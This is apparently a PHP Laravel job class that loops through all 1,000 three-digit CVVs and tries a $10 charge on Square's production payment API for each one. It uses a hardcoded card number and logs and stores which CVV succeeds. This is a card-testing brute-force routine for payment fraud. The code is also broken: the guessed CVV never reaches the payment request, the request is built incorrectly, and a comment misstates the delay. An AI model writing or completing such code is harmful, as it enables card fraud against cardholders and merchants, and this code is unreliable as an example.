<?php

namespace App\Jobs;

use App\Models\Square;
use Illuminate\Bus\Queueable;
use Illuminate\Contracts\Queue\ShouldBeUnique;
use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Foundation\Bus\Dispatchable;
use Illuminate\Queue\InteractsWithQueue;
use Illuminate\Queue\SerializesModels;
use Illuminate\Support\Facades\Log;
use Square\SquareClient;
use Square\Models\CreatePaymentRequest;
use Square\Models\Money;


class ChargeCardJob implements ShouldQueue
{
    use Dispatchable, InteractsWithQueue, Queueable, SerializesModels;

    /**
     * Create a new job instance.
     *
     * @return void
     */
    protected $cvv;

    public function __construct($cvv)
    {
        $this->cvv = $cvv;
    }

    /**
     * Execute the job.
     *
     * @return void
     */
    public function handle()
    {
        $client = new SquareClient([
            'accessToken' => env('SQUARE_ACCESS_TOKEN'),
            'environment' => 'production',
            'applicationId' => env('SQUARE_APPLICATION_ID'),
        ]);

        $testCardData = [
            'card_number' => '4111111111111111',
            'expiration_month' => '12',
            'expiration_year' => '2024',
        ];


        $paymentsApi = $client->getPaymentsApi();

        // Create a Money object for the amount to charge
        $money = new Money();
        $money->setAmount(1000); // Charge amount in cents (1000 cents = $10.00)
        $money->setCurrency('USD');


        // Hardcoded test card data


        $createPaymentRequest = new CreatePaymentRequest(
            $testCardData,
            uniqid(),       // Unique idempotency key
            $money
        );

        try {
            $response = $paymentsApi->createPayment($createPaymentRequest);

            // Log the entire response for debugging
            Log::info('Square API Response', [
                'cvv' => $this->cvv,
                'response' => $response
            ]);

            if ($response->isSuccess()) {
                $payment = $response->getResult()->getPayment();
                // Save successful payment info along with CVV
                Square::create([
                    "cvv" => $this->cvv,
                    "success" => true,
                    "payment_id" => $payment->getId(),
                ]);
            } else {
                // Save failed payment info along with CVV
                Square::create([
                    "cvv" => $this->cvv,
                    "success" => false,
                    'errors' => $response->getErrors(), // Log errors if any
                ]);
            }
        } catch (\Exception $e) {
            // Log the exception message
            Log::error('Error processing payment', [
                'cvv' => $this->cvv,
                'message' => $e->getMessage()
            ]);
        }
    }

    public function chargeCards()
    {
        for ($cvv = 0; $cvv <= 999; $cvv++) {
            $formattedCvv = str_pad($cvv, 3, '0', STR_PAD_LEFT); // Pad CVV to ensure it's three digits
            ChargeCardJob::dispatch($formattedCvv)->delay(now()->addSeconds(5)); // Dispatch job with 2 seconds delay
        }

        return response()->json(['success' => true, 'message' => 'Jobs dispatched.']);
    }
}
